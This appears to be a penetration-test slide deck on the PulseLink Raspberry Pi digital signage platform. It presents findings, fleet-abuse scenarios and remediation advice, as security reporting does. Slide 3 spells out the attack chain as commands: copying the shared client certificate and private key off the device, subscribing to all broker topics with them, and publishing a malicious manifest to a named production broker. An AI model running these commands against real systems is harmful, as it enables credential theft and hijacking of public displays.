# PulseLink Pi — Agent-Suggested Presentation (7 Slides)

**Engagement:** pulselink-pi  
**Date:** 2026-03-17  
**Method:** OpenClaw Specter Framework — Agent-Assisted Network Attack Simulation  
**Duration:** ~90 minutes  
**Risk Rating:** CRITICAL (CVSS 9.8)

> **Why 7 slides?** This engagement produced rich, layered findings — a 5-step attack chain from passive sniffing to fleet-wide content injection, a B2B2C business model that amplifies impact, 5 distinct root causes, and 5 untested physical "what-if" vectors. A 4-slide format would force us to compress the attack narrative, findings, and remediation into overcrowded slides. 7 slides gives each phase room to breathe: the business context (why it matters), the attack (how we did it), the findings (what's broken), the what-ifs (what else could go wrong), and the fixes (how to remediate). This is the right format for this depth of engagement.

---

### SLIDE 1: Title

**PulseLink IoT Digital Signage — Security Assessment**

- **Target:** Raspberry Pi 5 running PulseLink (Electron + Go MQTT client)
- **Broker:** pulse.n-compass.online:8883 (MQTTS)
- **Date:** 2026-03-17
- **Risk Rating:** CRITICAL (CVSS 9.8)
- **Method:** OpenClaw Specter Framework — Agent-Assisted Network Attack Simulation
- **Assessment Team:** specter-exploit, specter-post, specter-report

**Speaker Notes:**
> "This is the security assessment of the PulseLink digital signage platform, deployed on Raspberry Pi 5 devices. We performed an authorized penetration test against a single device and its cloud MQTT broker. What we found affects the entire fleet."

---

### SLIDE 2: Business Model & Attack Surface

**Visual:** Architecture diagram — Pi device on WiFi → outbound to cloud MQTT broker. Below: B2B2C flow (NTV → Dealers → Hosts → Players).

**Content:**

**The Platform:**
- n-compass TV operates a B2B2C digital signage ad network
- Revenue flows up: Hosts pay Dealers, Dealers pay NTV
- Ads flow down: NTV pushes content → Players (screens) display it
- Devices connect OUT to broker every 30 seconds via TLS

**The Target:**
- Device: `pi@192.168.0.125` on WiFi
- Only 2 open ports: SSH (non-standard) + RPCBind
- MQTT client — serves nothing, connects outbound
- Attacking ports directly = dead end

**Key Insight:**
> PulseLink is an MQTT **client**, not a server. The real vector isn't the ports — it's the traffic.

**Speaker Notes:**
> "PulseLink is part of n-compass TV's digital signage network. It's a B2B2C model — think of it as an ad network where content flows down from the platform to screens in public spaces. The Pi sits on WiFi and connects outbound to their cloud MQTT broker every 30 seconds. We scanned it and found only two open ports. Not much to attack directly — because the Pi isn't serving anything. It's a client. So we shifted our approach: instead of attacking the device, we attacked the traffic it was sending."

---

### SLIDE 3: The Attack — From Sniffing to Fleet Control

**Visual:** Vertical attack chain diagram (5 steps), certificate extraction moment highlighted in red as the pivot point.

**Content:**

| Step | Action | Result |
|------|--------|--------|
| **1. Discovery** | nmap scan → Pi found, MQTT confirmed | Target identified at 192.168.0.125 |
| **2. Traffic Capture** | tcpdump on port 8883 | TLS-encrypted MQTT heartbeat (~30s), client ID `dadf6f9ef35e55ab` |
| **3. Certificate Extraction** | SCP from `/opt/pulselink/client_certs/` | Private key at **644 permissions (world-readable)**, cert name: `client_pi_generic` — **shared fleet-wide** |
| **4. Broker Exploitation** | `mosquitto_sub` with stolen certs | **Connected successfully**, wildcard subscription (`#`) — ALL fleet topics visible |
| **5. Content Injection** | `mosquitto_pub` → malicious manifest | Pushed content to ANY device or ALL devices fleet-wide, retained message for persistence |

**The kill chain in five commands:**
```
# Discover MQTT traffic
tcpdump -i wlan0 -nn port 8883 -c 100

# Extract certificates
scp pi@192.168.0.125:/opt/pulselink/client_certs/* .

# Connect to broker — SUCCESS
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt --cert client_pi_generic.crt \
  --key client_pi_generic.key -t "#" -v

# Inject content to any device
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/content" -f malicious_manifest.json
```

**Speaker Notes:**
> "Here's the attack chain. We scanned the network, confirmed MQTT traffic with tcpdump, then went after the credentials. The device had a client_certs directory with TLS certificates. The private key had 644 permissions — readable by any user. And the certificate name was client_pi_generic — one generic certificate shared across the entire fleet. We extracted the certs, connected to the broker, subscribed to the wildcard topic, and could see every device's traffic. Then we published a malicious manifest and it appeared on the display. One shared certificate. Five commands. Full fleet compromise."

---

### SLIDE 4: Findings Summary — What's Broken

**Visual:** Severity-coded table of 5 root causes, each with detail and impact.

**Content:**

| # | Finding | Severity | Detail |
|---|---------|----------|--------|
| 1 | **Shared Fleet Certificate** | CRITICAL | `client_pi_generic` deployed to ALL devices — one compromise = fleet compromise |
| 2 | **World-Readable Private Key** | HIGH | 644 permissions — any user or compromised process can extract it |
| 3 | **Wildcard Topic Access** | CRITICAL | Broker allows `#` subscription from device certs (CVE-2024-31409 pattern) |
| 4 | **No Content Integrity Validation** | CRITICAL | Devices accept manifests without signature verification |
| 5 | **No Certificate Pinning** | HIGH | No MITM protection — broker identity not validated by client |

**The core problem:**
> The broker trusts the certificate, but the certificate is shared and extractable. Device identity should be cryptographic and unique; currently it is neither.

**Speaker Notes:**
> "Five root causes made this possible. The biggest: one certificate shared across the entire fleet. There's no per-device identity. The private key was also world-readable — 644 instead of 600. The broker allows wildcard topic subscriptions, which mirrors a known CVE pattern. And there's no content validation — devices accept any manifest the broker sends. The core problem is that trust is at the wrong layer. The broker trusts the certificate, but the certificate is shared and extractable."

---

### SLIDE 5: What-If Vectors — What Else Could Go Wrong

**Visual:** Two-panel layout. Left: fleet-scale attack scenarios. Right: physical attack vectors (not tested).

**Content:**

**Fleet-Scale Impact Scenarios:**

| Scenario | Impact |
|----------|--------|
| False emergency alerts on all screens | Mass panic in hospitals, airports, transit stations |
| Mass phishing via malicious QR codes | Hundreds of public screens displaying phishing lures |
| Fleet blackout — restart/stop commands | Revenue loss, SLA violations across all clients |
| Ransom demand — pay or we show offensive content | Criminal liability, brand destruction |
| Pivot into dozens of local networks | Each device = foothold into its physical location |

**Physical Attack Vectors (Not Tested):**

| Vector | What-If | Risk |
|--------|---------|------|
| UART via GPIO pins 14/15 | Direct root shell — no SSH, no password | HIGH |
| Physical access + `sudo NOPASSWD` | Instant root — discovered in earlier testing | CRITICAL |
| Electron/Chromium CVEs | CVE-2025-6558, CVE-2025-2783 — sandbox escape | HIGH |
| USB gadget attack | USB OTG mode — keystroke injection or fake storage | MEDIUM |
| WiFi deauth | Disconnect Pi from network → denial of service | LOW |

**Speaker Notes:**
> "Let's talk about what-ifs. On the fleet side: false emergency alerts on every screen in every public location — imagine that in an airport or hospital. Phishing QR codes. Blackout. Ransom demands. And each device is a network pivot point into its physical location. Beyond the network attack we executed, there are physical vectors we didn't test. UART on the GPIO pins gives a direct root shell. Sudo runs without a password. The Electron runtime runs Chromium 134 with known zero-days. USB gadget mode, WiFi deauth — all viable."

---

### SLIDE 6: Remediation — Fix It

**Visual:** Two-tier action table (Immediate / Strategic) with time estimates. Key quote highlighted.

**Content:**

**Immediate Fixes (Under 4 Hours):**

| Issue | Fix | Time |
|-------|-----|------|
| Shared fleet certificate | Issue **UNIQUE per-device certificates** (CN = device serial) | 4 hours |
| World-readable private key | `chmod 600 /opt/pulselink/client_certs/*.key` | 1 minute |
| No content validation | SHA-256 checksums on all published content | 1 hour |
| No certificate pinning | Implement cert pinning in Paho MQTT client | 2 hours |
| Wildcard ACL on broker | Restrict device topics to own serial only (`device/{serial}/#`) | 30 minutes |

**Strategic Improvements:**

| Issue | Fix | Priority |
|-------|-----|----------|
| UART attack surface | Test and mitigate (disable UART or require auth) | P1 |
| MQTT anti-replay | Add message signing + timestamps | P1 |
| Electron runtime | Update to latest — patch CVE-2025-6558, CVE-2025-2783 | P1 |
| Certificate revocation | Implement CRL/OCSP for fleet certificates | P2 |
| Physical security | Tamper-evident enclosures, disable unused interfaces | P2 |

> **🔑 Key Message:**  
> *"One shared certificate compromised an entire fleet. Unique per-device certificates eliminate the blast radius of every other finding by orders of magnitude."*

**Speaker Notes:**
> "Here's how to fix it. The good news: most of these are fast. Fixing key permissions takes one minute. The wildcard ACL takes 30 minutes. Content validation takes about an hour. The big one is per-device certificates — about 4 hours of work, but it's the single most impactful change. It transforms a fleet-wide compromise into a single-device issue. For strategic improvements, prioritize UART hardening, MQTT message signing, and updating Electron to patch the known zero-days."

---

### SLIDE 7: Key Takeaways

**Visual:** Clean slide with 4-5 bold takeaway statements, minimal text.

**Content:**

🔑 **5 Takeaways**

1. **One shared certificate = full fleet compromise.**  
   No per-device identity means compromising any device compromises all devices.

2. **MQTT is the attack surface, not the ports.**  
   PulseLink is a client, not a server. Attacking the traffic — not the device — was the winning strategy.

3. **IoT physical security matters.**  
   UART, USB gadget mode, and unpatched runtimes are real attack vectors that bypass all network controls.

4. **Simple fixes, massive impact.**  
   chmod 600 takes one minute. Per-device certs take four hours. Neither requires architecture changes.

5. **This isn't hypothetical.**  
   Public-facing displays showing false emergency alerts could cause physical harm. This is a safety issue, not just a data issue.

> **Bottom line:** Fix the certificates first. Everything else follows.

**Speaker Notes:**
> "Five takeaways. First: one shared certificate compromised the entire fleet. Second: the real attack surface was MQTT traffic, not the device ports. Third: physical security on IoT devices can't be ignored — UART, USB, unpatched runtimes. Fourth: the fixes are simple and fast — chmod takes one minute, per-device certs take four hours. Fifth: this isn't abstract. These displays are in hospitals, airports, transit stations. A false emergency alert could cause real harm. Fix the certificates first. Everything else follows."
